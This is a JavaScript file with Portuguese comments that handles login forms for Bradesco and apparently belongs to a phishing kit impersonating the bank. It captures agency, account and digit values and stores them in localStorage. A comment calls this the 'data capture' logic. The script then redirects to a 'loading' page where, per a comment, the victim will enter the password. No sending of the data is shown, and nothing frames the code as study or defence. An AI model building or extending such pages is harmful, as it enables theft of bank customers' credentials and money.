document.addEventListener("DOMContentLoaded", () => {
    // 1. Vincula o formulário padrão de Desktop
    const formDesktop = document.getElementById("form-login-bradesco");
    if (formDesktop) {
        formDesktop.addEventListener("submit", (event) => {
            event.preventDefault();
            // Executa a lógica passando os IDs do Desktop
            processarFluxoLogin("campo-agencia", "campo-conta", "campo-digito");
        });
    }

    // 2. Vincula o formulário de Mobile (Garantindo o DRY!)
    // Certifique-se de que o form que aparece no celular tenha o ID "form-login-mobile"
    const formMobile = document.getElementById("form-login-mobile");
    if (formMobile) {
        formMobile.addEventListener("submit", (event) => {
            event.preventDefault();
            // Executa a EXATA mesma lógica, mas com os IDs do Mobile
            processarFluxoLogin("campo-agencia-m", "campo-conta-m", "campo-digito-m");
        });
    }
});

/**
 * Função Genérica e Reutilizável de Login (A essência do DRY)
 * Captura os dados baseado nos IDs passados, valida, salva e redireciona.
 */
function processarFluxoLogin(idAgencia, idConta, idDigito) {
    const inputAgencia = document.getElementById(idAgencia);
    const inputConta = document.getElementById(idConta);
    const inputDigito = document.getElementById(idDigito);

    // Proteção caso algum elemento não exista na árvore DOM da página
    if (!inputAgencia || !inputConta || !inputDigito) return;

    const agencia = inputAgencia.value.trim();
    const conta = inputConta.value.trim();
    const digito = inputDigito.value.trim();

    // Validação rápida para evitar o envio de campos vazios
    if (!agencia || !conta || !digito) {
        alert("Por favor, preencha todos os campos de Agência, Conta e Dígito.");
        return;
    }

    // A lógica de captura de dados que o Renato estruturou
    const contaCompleta = `${conta}${digito}`;

    // Salva provisoriamente no localStorage para a próxima página ler
    localStorage.setItem("agencia", agencia);
    localStorage.setItem("conta", contaCompleta);

    // Redireciona para a página de loading onde o usuário digitará a senha
    window.location.href = "pages/loading/loading.html";
}